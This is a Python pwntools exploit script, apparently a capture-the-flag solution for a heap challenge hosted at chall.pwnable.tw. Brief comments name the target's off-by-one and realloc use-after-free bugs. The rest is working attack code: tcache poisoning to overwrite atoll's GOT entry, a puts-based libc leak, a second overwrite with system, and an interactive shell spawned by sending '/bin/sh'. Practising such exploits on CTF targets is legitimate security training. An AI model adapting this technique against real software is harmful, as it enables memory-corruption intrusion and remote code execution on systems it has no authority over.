from pwn import *

#r = process("./R", env={"LD_PRELOAD" : "./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so"})
r = remote('chall.pwnable.tw',10106)
def create(idx,size,data):
    r.sendlineafter(b'Your choice: ',b'1')
    r.sendlineafter(b'Index:',str(idx))
    r.sendlineafter(b'Size:',str(size))
    r.sendlineafter(b'Data:',data)

def realloc_edit(idx,size,data):
    r.sendlineafter(b'Your choice: ',b'2')
    r.sendlineafter(b'Index:',str(idx))
    r.sendlineafter(b'Size:',str(size))
    r.sendlineafter(b'Data:',data)

def realloc_free(idx):
    r.sendlineafter(b'Your choice: ',b'2')
    r.sendlineafter(b'Index:',str(idx))
    r.sendlineafter(b'Size:',str(0))

def free(idx):
    r.sendlineafter(b'Your choice: ',b'3')
    r.sendlineafter(b'Index:',str(idx))

### vuln1 : there is a null byte off by one bug in alloc function
### vuln2 : call realloc with size 0 will call free(), and ptr in heap[] will not delete -> UAF
### vuln3 : call realloc with same size -> edit chunks data 

### use tcache dup to overwrite got of atoll to begin value of puts
### triger atoll will lead to dlresolve 
### 


atoll_addr = 0x404048
puts_plt = 0x401056
atoll_plt = 0x401096
heap_addr = 0x4040B0


## first chunks  to set up tcache, let the first tcache be address we want
create(1,0x78,'')   
realloc_free(1)   
realloc_edit(1,0x78,p64(atoll_addr) + p64(0))  ## tcache dup and set target address

create(0,0x78,b'')       # first malloc
realloc_edit(0,0x38,b'') # change size to some value != 0x78, -> chunks will not go to 0x78 tcache
free(0)   # clean heap[0]
realloc_edit(1,0x38,p64(0)*2)  
free(1)  # clean heap[1]



### second chunks to set up tcache, let the first tcache be address we want, the same as first chunk
create(0,0x18,'') 
realloc_free(0)
realloc_edit(0,0x18,p64(atoll_addr) + p64(0))   ## tcache dup fake fd 
create(1,0x18,'') 
realloc_edit(1,0x58,p64(0)*2)
free(1)
realloc_edit(0,0x58,p64(0)*2) 
free(0)

payload  = p64(puts_plt)
create(0,0x78,payload)  ## use malloc to get target address  and rewrite it to puts_plt

# ### triger atoll and it will resolve to puts and use it to leak libc 
r.sendlineafter(b'Your choice: ',b'3')
r.sendlineafter(b'Index:',b'a'*7+b'b')
r.recvuntil(b'b')
libc_base = u64(r.recv(6)+b'\x00\x00')  - 0x83e0a
success(f'libc : {hex(libc_base)}')

# #### 
system_addr = libc_base + 0x52fd0

payload = p64(system_addr)
r.sendlineafter(b'Your choice: ',b'1')
r.sendlineafter(b'Index:',b'\x00')   ### puts will return string length it puts, so we insert b'\x00' it will return value 1.
r.sendlineafter(b'Size:',b'aaaaaaaaaaaa')
r.sendlineafter(b'Data:',payload)  # get target chunks and rewrite it to system 

r.sendlineafter(b'Your choice: ',b'3')
r.sendlineafter(b'Index:',b'/bin/sh\x00')  ### get shell
r.interactive()